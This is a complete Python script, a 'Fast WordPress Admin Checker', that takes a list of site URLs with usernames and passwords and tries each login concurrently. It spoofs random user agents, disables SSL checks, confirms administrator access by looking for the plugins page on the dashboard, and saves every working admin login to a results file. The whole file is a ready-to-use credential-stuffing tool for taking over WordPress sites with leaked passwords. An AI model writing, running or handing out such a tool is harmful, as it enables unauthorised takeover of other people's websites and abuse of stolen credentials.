import aiohttp
import aiofiles
import asyncio
import os
import re
import logging
from fake_useragent import UserAgent

# Setup logging (optional)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

ua = UserAgent()
semaphore = asyncio.Semaphore(20)  # Max 20 concurrent scans

async def check_wp_admin(session, username, password, wp_url):
    try:
        headers = {'User-Agent': ua.random}
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In'
        }

        # Disable SSL verification and add timeout
        async with session.post(wp_url, data=login_data, headers=headers, ssl=False) as login_resp:
            if login_resp.status != 200:
                return False

        dashboard_url = wp_url.replace('wp-login.php', 'wp-admin/')
        async with session.get(dashboard_url, headers=headers, ssl=False) as dash_resp:
            if dash_resp.status != 200:
                return False
            html = await dash_resp.text()
            return "<a href='plugins.php'" in html or '<a href="plugins.php"' in html

    except Exception as e:
        logging.warning(f"Error checking {username}@{wp_url}: {e}")
        return False

async def check_and_save(session, url, user, passwd, output_file):
    async with semaphore:
        is_admin = await check_wp_admin(session, user, passwd, url)
        if is_admin:
            result_line = f"{url}:{user}:{passwd}"
            print(result_line)
            async with aiofiles.open(output_file, 'a', encoding='utf-8') as f:
                await f.write(result_line + '\n')

async def process_credentials(input_file, output_file):
    if os.path.exists(output_file):
        os.remove(output_file)

    timeout = aiohttp.ClientTimeout(total=15)  # 15s timeout per site
    connector = aiohttp.TCPConnector(ssl=False)  # Disable SSL verification

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        async with aiofiles.open(input_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() async for line in f if line.strip()]

        tasks = []
        for line in lines:
            match = re.match(r'^(https?://[^:]+/wp-login\.php):([^:]+):(.+)$', line)
            if not match:
                continue
            url, user, passwd = match.groups()
            tasks.append(check_and_save(session, url, user, passwd, output_file))

        await asyncio.gather(*tasks)

def main():
    print("=== Fast WordPress Admin Checker ===")
    input_file = input("Input file path: ").strip()
    while not os.path.exists(input_file):
        input_file = input("File not found! Try again: ").strip()

    output_file = input("Output file (default: results.txt): ").strip() or "results.txt"

    print("\nStarting async admin checks...\n")
    asyncio.run(process_credentials(input_file, output_file))
    print(f"\nScan complete. Administrator results saved to {output_file}")

if __name__ == "__main__":
    main()
